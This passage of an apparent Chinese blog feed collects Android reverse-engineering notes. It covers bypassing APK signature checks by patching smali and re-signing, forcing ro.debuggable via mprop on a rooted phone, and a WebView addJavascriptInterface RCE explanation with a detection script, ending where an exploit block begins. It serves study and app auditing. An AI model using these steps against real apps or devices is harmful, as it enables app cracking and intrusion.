alt="image-20211116112323389"></p><p>所以说如果我们不进行签名校验，那么不法者仅仅只凭借apktool和Auto-sign工具就可以轻松破解我们的app并重新打包成新的apk</p></blockquote><h2 id="绕过Java代码签名校验"><a href="#绕过Java代码签名校验" class="headerlink" title="绕过Java代码签名校验"></a>绕过Java代码签名校验</h2><p>需要将apk经过<code>apktool</code>或者<code>jadx</code>或<code>dex2jar</code>或者<code>jd-jui</code>反编译代码后，对代码进行审计，查找apk签名校验代码的位置，然后对其进行修改，即可绕过。</p><p>一般通过解压apk文件获取到dex文件，可能会有多个dex，那这个时候使用dex2jar2.0之前的版本只能一个一个进行反编译，这样很麻烦，使用2.1或2.2版本可以直接反编译所有的dex文件并合并到一个jar文件，之后再用jd-jui打开即可</p><ul><li>dex2jar2.2下载地址：<a href="https://github.com/pxb1988/dex2jar/releases">https://github.com/pxb1988/dex2jar/releases</a></li></ul><p>然后把需要反编译的apk放到dex2jar文件目录下，运行命令完成后，会在当前目录生成一个xx-dex2jar.jar文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat xx.apk</span><br></pre></td></tr></table></figure><blockquote><p>运行可能会出现报错信息</p><ul><li>Exception in thread “main” java.lang.OutOfMemoryError: GC overhead limit exceeded</li><li>Exception in thread “main” java.lang.OutOfMemoryError: Java heap space</li></ul><p>解决方法：</p><p>用记事本打开 d2j_invoke.bat 文件， 修改最后一行内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xms512m -Xmx1024m -cp <span class="string">&quot;%CP%&quot;</span> %*</span><br></pre></td></tr></table></figure><p>具体可以参考这篇文章 <a href="https://www.cnblogs.com/bolang100/p/6478537.html">java heap space解决方法和JVM参数设置</a></p><p>根据他说的 初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。修改后如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xms512m -Xmx8192m -cp &quot;%CP%&quot; %*</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211116160124390.png" alt="image-20211116160124390"></p><p>虽然会有很多警告，但是还是能用 jd-gui 打开</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211116160232145.png" alt="image-20211116160232145"></p><p>然后就可以查看java代码了。通过查看Java代码我们可以快速搜索出需要的Android API方法，再通过API方法的位置来定位到相应smali文件的大概位置。</p><p>比较简单通用的签名校验是用signatures来获取，所以可以全局搜索关键字来尝试，并找到相应的调用方法</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211116160807061.png" alt="image-20211116160807061"></p><p>再查找f()方法被调用的地方，我们可以先通过AndroidManifest.xml文件找到Application和主Activity，一般在这里都会进行一些校验和身份状态的判断，改好一处之后，通过运行app，再根据app退出或者卡住的位置来定位下一处校验代码的位置，直到运行成功。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211116160914543.png" alt="image-20211116160914543"></p><p>搜索”F010AF8CFE611E1CC74845F80266”，定位签名校验的反编译代码位置</p><blockquote><p>网上这一步直接在smali代码中寻找并修改逻辑关系：将判断语句<strong>if-nezv0, :cond_1</strong>更改为<strong>if-eqz v0, :cond_1</strong></p><p>然后通过apktool重新打包并签名，就能成功运行APP</p></blockquote><p><em>关于hook绕过的方式参考末尾文章，里面有详细讲解，这里先不做学习</em></p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>还有些涉及so层或者其他方面的校验机制没有写，之后再做添加。</p><p>所谓绕过的关键点就在把apk成功反编译为java代码再进行阅读查找，还是代码审计。。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/1B1399BF.jpg" alt="img"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://zhuanlan.zhihu.com/p/389584833">Android反编译工具 apktool 、dex2jar、jd-gui、jadx的对比及使用</a></p><p><a href="https://www.cnblogs.com/bolang100/p/6478537.html">java heap space解决方法和JVM参数设置</a></p><p><a href="https://zhuanlan.zhihu.com/p/363049166">【Android进阶】什么？你的签名校验形同虚设？？？</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android基础知识总结</title>
      <link href="2023/11/28/Android%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>2023/11/28/Android%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="安卓的系统架构"><a href="#安卓的系统架构" class="headerlink" title="安卓的系统架构"></a>安卓的系统架构</h2><ol><li><code>linux内核层</code>：提供Android硬件的各种驱动（显示驱动，音频驱动，蓝牙驱动，WiFi驱动等等）</li><li><code>系统运行库层</code>：提供各种特性支持（数据库支持，绘图支持，浏览器内核支持）</li><li><code>应用框架层</code>：构建应用程序的各种API</li><li><code>应用层</code>：所有安装到手机的应用程序就属于该层。</li></ol><h2 id="安卓四大组件"><a href="#安卓四大组件" class="headerlink" title="安卓四大组件"></a>安卓四大组件</h2><ol><li><code>活动</code>（activity）：所有Android应用程序的根本，应用程序上看到的东西都是放在activity</li><li><code>服务</code>（service）：不出现在屏幕上，在后台运行，及时应用程序关闭也会在后台运行，比如在微信聊天的时候，酷狗音乐在后台运行</li><li><code>广播接收器</code>（Broadcast Receiver）：接收其他的广播消息（短信，电话，应用消息等等），比如在微信聊天的时候，收到一条短信在屏幕上方弹出通知</li><li><code>内容提供器</code>（Content Provider）：与其他应用共享数据资源，比如微信读取手机联系人等</li></ol><blockquote><p>这四大组件所涉及的多进程间的通信底层都是依赖于Binder IPC（进程间通信）机制</p><p>当然也存在部分其他的IPC方式，比如Zygote通信便是采用socket。</p></blockquote><h2 id="apk基本结构"><a href="#apk基本结构" class="headerlink" title="apk基本结构"></a>apk基本结构</h2><ul><li>assets  资源文件（图片、音频、数据库、网页、配置文件等）</li><li>res    资源文件，需要编译（布局）</li><li>lib    各种平台下使用的对应的so文件</li><li>libs    第三方引用的库，比如jar包</li><li>META-INF    签名文件</li><li>resources.arsc    资源加密（语言包）</li><li>AndroidManifest.xml   清单文件（图标、界面、权限、入口）</li><li>classes.dex    源代码</li></ul><h2 id="JVM、DVM与ART"><a href="#JVM、DVM与ART" class="headerlink" title="JVM、DVM与ART"></a>JVM、DVM与ART</h2><h3 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h3><p>java虚拟机，运行.java文件编译后的.class文件</p><h3 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h3><ul><li>Android4.4及以前使用的都是Dalvik虚拟机，我们知道Apk在打包的过程中会先将java等源码通过javac编译成.class文件，但是我们的Dalvik虚拟机只会执行.dex文件，这个时候dx会将.class文件转换成Dalvik虚拟机执行的.dex文件。Dalvik虚拟机在启动的时候会先将.dex文件转换成快速运行的机器码，又因为65535这个问题，导致我们在应用冷启动的时候有一个合包的过程，最后导致的一个结果就是我们的app启动慢，这就是Dalvik虚拟机的JIT特性（Just In Time）。</li></ul><h3 id="ART"><a href="#ART" class="headerlink" title="ART"></a>ART</h3><p>ART虚拟机是在Android5.0才开始使用的Android虚拟机，ART虚拟机必须要兼容Dalvik虚拟机的特性，但是ART有一个很好的特性AOT（ahead of time），这个特性就是我们在安装APK的时候就将dex直接处理成可直接供ART虚拟机使用的机器码，ART虚拟机将.dex文件转换成可直接运行的.oat文件，ART虚拟机天生支持多dex，所以也不会有一个合包的过程，所以ART虚拟机会很大的提升APP冷启动速度。</p><p>Xposed hook的是java代码，Xposed 87版不支持5.0及以上系统。Xposed 89版支持 android 5.0-7.1</p><h2 id="Android分区（df查看）"><a href="#Android分区（df查看）" class="headerlink" title="Android分区（df查看）"></a>Android分区（df查看）</h2><ul><li><code>System分区</code>：刷ROM的分区</li><li><code>Data分区</code>： 我们装APK的分区</li><li><code>Cache分区</code>： 缓存分区</li><li><code>SDCard分区</code>： 挂载的SD卡</li></ul><p>Android的用户组有 system、root、shell</p><h3 id="data分区常用目录"><a href="#data分区常用目录" class="headerlink" title="data分区常用目录"></a>data分区常用目录</h3><p>app , system , data ,local，misc</p><p>其中system，local可以进入并使用ls等命令。data，app可以进入，但不能用ls命令。</p><h4 id="1、data-data目录"><a href="#1、data-data目录" class="headerlink" title="1、data/data目录"></a>1、data/data目录</h4><p>存放的是所有APK程序数据的目录，每个APK对就一个自己的Data目录，就是在data/data/目录下，会产生一个跟Package一样的目录。如有一个APK,它的包名叫com.test.hello则,在data/data/目录下会有一个com.test.hello的目录,这个APK只能操作此目录,不能操作其它APK的目录</p><h4 id="2、data-app目录"><a href="#2、data-app目录" class="headerlink" title="2、data/app目录"></a>2、data/app目录</h4><p>用户安装的APK放在这里。我们如果把APK放入这个文件夹下面的话，就算安装好了。这就叫静默安装。不用管APK文件里面的lib目录下的库文件，系统会自动帮我们放入调用库的。</p><h4 id="3、data-system目录"><a href="#3、data-system目录" class="headerlink" title="3、data/system目录"></a>3、data/system目录</h4><p>有packages.xml ,packages.list,appwidgets.xml, 等等一些记录手机安装的软件，Widget等信息</p><h4 id="4、data-misc目录"><a href="#4、data-misc目录" class="headerlink" title="4、data/misc目录"></a>4、data/misc目录</h4><p>保存WIFI帐号，VPN设置信息等。如保存了一个WIFI连接帐号，则此目录下的WIFI目录下面可以查看到。</p><h3 id="system分区常用目录"><a href="#system分区常用目录" class="headerlink" title="system分区常用目录"></a>system分区常用目录</h3><p>app , lib, xbin, bin , media，framework.</p><h4 id="1、system-app目录"><a href="#1、system-app目录" class="headerlink" title="1、system/app目录"></a>1、system/app目录</h4><p>存放系统自带的APK。没有测试过是否将APK放入到System/app目录下，也是静默安装APK</p><h4 id="2、system-lib目录"><a href="#2、system-lib目录" class="headerlink" title="2、system/lib目录"></a>2、system/lib目录</h4><p>存放APK程序用到的库文件</p><h4 id="3、system-bin目录和system-xbin目录"><a href="#3、system-bin目录和system-xbin目录" class="headerlink" title="3、system/bin目录和system/xbin目录"></a>3、system/bin目录和system/xbin目录</h4><p>存放的是shell命令</p><h4 id="4、system-framework目录"><a href="#4、system-framework目录" class="headerlink" title="4、system/framework目录"></a>4、system/framework目录</h4><p>启用Android系统所用到框架，如一些jar文件</p><blockquote><p>Android下面的目录都是有权限的,要操作目录都需要有此权限才能操作,如果没有,则使用chomd777来修改.如果是分区根目录,如/data分区, /system分区.都没有权限,则需要重新挂载. 使用 mount -oremount XX</p></blockquote><h2 id="adb命令"><a href="#adb命令" class="headerlink" title="adb命令"></a>adb命令</h2><p>adb devices</p><p>adb connect 127.0.0.1:21053</p><p>adb -s name shell  指定设备进入shell</p><p>adb push</p><p>adb pull</p><p>adb install</p><h2 id="真机调试"><a href="#真机调试" class="headerlink" title="真机调试"></a>真机调试</h2><h3 id="开启usb调试"><a href="#开启usb调试" class="headerlink" title="开启usb调试"></a>开启usb调试</h3><p>点击7次【版本号】，使得手机处于开发者模式，然后点击【系统和更新】，里面有【开发人员选项】，开启usb调试的勾选。</p><p>调试一个APK，必须满足一下两个条件中的任何一个：</p><p>1、<code>AndroidMainifest.xml</code> 中的<code>android：debuggable = &quot;true&quot;</code>  </p><p>（方法： 反编译后在 Application标签中加入 android：debuggable = “true”  然后回编译，但是如果apk加了壳或其他保护措施，是不能够回编译成功的，所以一般不考虑这个手段去调试）</p><p>2、手机中文件 <code>/default.prop</code> 中的 ro.debuggable 的值为1</p><p>（方法：改文件或者改内存）</p><blockquote><p>init进程会解析这个default.prop文件，然后把这些属性信息解析到内存中，给所有APP进行访问使用，所以在init进程的内存块中是存在这些属性值的，那么这时候我们可以利用进程注入技术，我们可以使用ptrace注入到init进程，然后修改内存中的这些属性值，只要init进程不重启，那么这些属性值就会生效。</p></blockquote><p>解决方法：(手机是root权限的前提下修改)</p><ol><li><p>先下载 <a href="https://github.com/wpvsyou/mprop">mprop</a></p></li><li><p>拷贝 mprop 到 /data/local/tmp/ 目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push mprop /data/local/tmp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211111093223843.png" alt="image-20211111093223843"></p></li><li><p>adb shell su; cd /data/local/tmp; chmod 777 mprop;</p></li><li><p>./mprop ro.debuggable 1</p></li><li><p>getprop ro.debuggable (查看此时 ro.deuggable在内存中的值)</p></li><li><p>stop start （重启adbd进程）</p></li></ol><h2 id="真机连接"><a href="#真机连接" class="headerlink" title="真机连接"></a>真机连接</h2><p>打开拨号界面，输入: <code>*#*#2846579#*#*</code>。自动进入工程菜单,选择<code>后台设置</code>——&gt;<code>usb端口设置</code>——&gt;<code>生产模式</code>.</p><p>在开发人员选项中打开<strong>“仅充电”模式下允许 ADB 调试</strong>，同时开启<strong>USB调试</strong>按钮 ，当手机屏幕弹出<strong>是否允许 USB 调试？</strong>时，选择<strong>确定</strong>。</p><p>在设置中搜索HDB，打开允许HiSuite通过HDB连接设备</p><p>在电脑中输入 adb kill-server（关闭adb服务） adb devices 查看是否已经连接成功</p><h3 id="连不上解决方案"><a href="#连不上解决方案" class="headerlink" title="连不上解决方案"></a>连不上解决方案</h3><h4 id="更改USB连接模式"><a href="#更改USB连接模式" class="headerlink" title="更改USB连接模式"></a>更改USB连接模式</h4><p>请您将USB连接模式改为<strong>传输照片</strong>或者<strong>传输文件</strong>。</p><h4 id="更换数据线尝试"><a href="#更换数据线尝试" class="headerlink" title="更换数据线尝试"></a>更换数据线尝试</h4><p>建议您使用原装数据线重新进行尝试。</p><h2 id="渗透测试技术点"><a href="#渗透测试技术点" class="headerlink" title="渗透测试技术点"></a>渗透测试技术点</h2><h3 id="HTTP端"><a href="#HTTP端" class="headerlink" title="HTTP端"></a>HTTP端</h3><p>可能存在JS加密 或 flash加密 或 有密码控件</p><p>flash逆向 看汇编代码</p><p>js加密分析</p><ul><li>函数定位</li></ul><p>​         搜索关键字、参数、url等</p><p>​         事件监听断点</p><p>​         函数调用栈</p><ul><li> 算法还原（JS调试工具）</li></ul><p>​        扣代码改写 —-&gt; 易语言调用</p><p>​        直接调用js加密库 —-&gt; 易语言调用</p><p>​        直接用易语言写</p><h3 id="TCP-socket-websockets"><a href="#TCP-socket-websockets" class="headerlink" title="TCP/socket/websockets"></a>TCP/socket/websockets</h3><p>抓包工具：wireshark、sniffer、iptool</p><h3 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h3><p>抓包工具：FD、HTTPdebugger、charles</p><p>安装xposed模块进行hook java证书验证的函数</p><p>如果app有加固，就先脱壳</p><p>java</p><p>​    加密 -&gt;  逆向 -&gt;  函数定位 -&gt; 算法还原（java + js）</p><p>​                                扣代码改写成jar包，易语言调用</p><p>​                                找js加密库，易语言调用</p><p>​                                直接用易语言写</p><p>so(c/c++)</p><p>如果有反调试的限制，不能调试了，就通过log输出的方式将想要的函数输出，或者hook</p><p>hook的用处：脱壳、函数定位、自吐算法（hook加密库）、修改代码（做app插件）</p><p>在 jdk/jre/lib/security/java.security 增加一行 BouncyCastleProvider</p><p>security.provide.11 = org.bouncycastle.jce.provider.BouncyCastleProvider</p><h2 id="Android-APP审计系统脑图"><a href="#Android-APP审计系统脑图" class="headerlink" title="Android APP审计系统脑图"></a>Android APP审计系统脑图</h2><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/checklist.jpg" alt="app安全脑图"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Webview漏洞初探</title>
      <link href="2023/11/28/Android%20Webview%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/"/>
      <url>2023/11/28/Android%20Webview%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>文章首发：<a href="https://xz.aliyun.com/t/11505">https://xz.aliyun.com/t/11505</a></p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>基于java语言开发的android系统，有许多android原生组件存在的问题，webview就是其中一个核心组件，它是app内部与web界面进行交互并进行展示页面的控件，相当于在软件内部嵌入的内置浏览器。由于其中使用的方式和场景复杂多样，所以webview组件在出现以来已经被挖掘出了许多重大漏洞，但是随着android系统版本的换代升级，这个组件的使用规范也被android官方不断的修复。</p><h2 id="二、java与javascript交互"><a href="#二、java与javascript交互" class="headerlink" title="二、java与javascript交互"></a>二、java与javascript交互</h2><p>webview常用于对url的请求、页面加载、渲染、页面交互等。</p><p>webview加载js又分为：本地加载（file:///android_asset/obj.html）、远程加载（<a href="https://vps:8080/exp.html%EF%BC%89">https://vps:8080/exp.html）</a></p><p>直接加载url：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    WebView webView;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        webView = (WebView) findViewById(R.id.web_view);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>); </span><br><span class="line">        webView.loadUrl(<span class="string">&quot;https://www.baidu.com&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地加载js：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    WebView webView;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">webView = (WebView) findViewById(R.id.web_view);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line">        <span class="comment">// 参数1：Javascript对象名</span></span><br><span class="line">        <span class="comment">// 参数2：Java对象名</span></span><br><span class="line">        webView.addJavascriptInterface(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">        webView.loadUrl(<span class="string">&quot;file:///android_asset/js.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span>    </span><br><span class="line">    <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解,API 17之下不添加注释仍可以调用</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jsCallJava</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, message, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>assets 文件夹下js.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>testjs<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--点击按钮则调用jsCallJava函数--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onClick</span>=<span class="string">&quot;window.main.jsCallJava(&#x27;Message From Js&#x27;)&quot;</span> &gt;</span>Js Call Java<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>整个实现过程：通过点击按钮，利用反射机制调用了app提供的<code>main</code>接口下的<code>jsCallJava</code>方法，传参为<code>Message From Js</code>  ， android中的回调函数再实现Toast弹窗功能。</p></blockquote><p>点击按钮实现java与JS的交互：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220624153414.png" alt="image-20220624153413907"></p><p>远程加载JS:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(<span class="string">&quot;http://192.168.50.177:8080/js.html&quot;</span>);   <span class="comment">//只需要将加载的url更改为http访问，并将js.html放在Python HttpServer下进行监听</span></span><br></pre></td></tr></table></figure><h2 id="三、漏洞探测"><a href="#三、漏洞探测" class="headerlink" title="三、漏洞探测"></a>三、漏洞探测</h2><p>熟悉java安全的都知道，由于上面的案例中代码并没有对<code>addJavascriptInterface</code>进行任何限制，所以可以利用<strong>反射</strong>机制调用<strong>Android API getRuntime</strong>进行远程代码执行。</p><p>POC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView漏洞检测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">提示：如何检测出“accessibility”和 “accessibilityTraversal”接口----设置-辅助功能-开启系统或第三方辅助服务<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">red</span>&gt;</span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">    <span class="comment">//遍历window对象,是为了找到包含getClass()的对象</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>) </span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj]) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">window</span>[obj].getClass();</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="string">&#x27;&lt;/span&gt;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                &#125;<span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line">                &#125;   </span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">        &#125; <span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span> &#123;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">check();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220624161618.png" alt="image-20220624161618289"></p><p>EXP：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 